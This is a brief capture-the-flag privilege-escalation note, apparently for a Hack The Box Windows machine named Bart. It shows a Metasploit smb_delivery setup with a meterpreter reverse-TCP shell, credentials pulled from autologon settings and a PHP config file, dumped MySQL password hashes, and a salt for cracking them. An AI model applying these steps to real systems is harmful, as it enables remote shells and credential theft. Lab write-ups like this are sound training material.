# Getting Root

![[Pasted image 20211115041100.png]]

DefaultDomainName    : DESKTOP-7I3S68E
DefaultUserName      : Administrator
DefaultPassword      : 3130438f31186fbaf962f407711faddb


## Metasploit 
```bash
use exploit/windows/smb/smb_delivery
set payload windows/x64/meterpreter/reverse_tcp
```

![[Pasted image 20211115045649.png]]

## Use post credentials with windows autologin
![[Pasted image 20211115050322.png]]
[+] AutoAdminLogon=1, DefaultDomain=DESKTOP-7I3S68E, DefaultUser=Administrator, DefaultPassword=3130438f31186fbaf962f407711faddb

Can use the creds for psexec


## Without MetaSploit

```bash
C:\inetpub\wwwroot\monitor>type config.php
type config.php
<?php
define('PSM_DB_HOST', 'localhost');
define('PSM_DB_PORT', '3306');
define('PSM_DB_NAME', 'sysmon');
define('PSM_DB_USER', 'daniel');
define('PSM_DB_PASS', '?St4r1ng1sCr33py?');
define('PSM_DB_PREFIX', '_');
define('PSM_BASE_URL', 'http://monitor.bart.htb');

```

![[Pasted image 20211115054004.png]]

Creds: harvey:!IC4nB3Th3B3st? 


![[Pasted image 20211115054706.png]]


### Mysql Daniel
* Forum database
![[Pasted image 20211115055226.png]]
bobby      | $P$Bf/6il9y3rO0aOeaJUEf7R.l.loWqj/


* Sysmon database
 ![[Pasted image 20211115055537.png]]
 
 daniel: $2y$10$uagzza/86ZyHN9D7rCz6duKcYFO2JwKY6vNIrjHzuXUiyhl4gZThS
 harvey; $2y$10$rX2CrXDnE06wOXL7H2Vm2OFSGOEqh5LifQ1Z/qZMmA9aEemoq3p0C
 bobby: $2y$10$dwC0mmzzxBk93jRIhr0Jb.7ksIBnME.Y5R7xOe51yi1fvifHmP3T.
 
 
 ### Mysql Harvey
 ![[Pasted image 20211115060227.png]]
 
 
 harvey:faeff13072fffdb78ec3b08427678f18295ee28b8b0befc63eea2135eee85df3
 bobby:e15929d8ce341f2dfa07ac7a0b6f32379e43868631f2aebc05a3a97b235d6dcc 
 daniel:f7dbfae1e05efda233b872e9b7f709d3a0f1b042813be01d7e5b9e9788c7c801
 
 
 ### Cracking the HASH
 
 salt of the hash found on  C:\inetpub\wwwroot\internal-01\simple_chat\includes\validation_func.php
 $salt = '8h@tr-waswe_aT#9TaCHuPhU';
 ![[Pasted image 20211115061459.png]]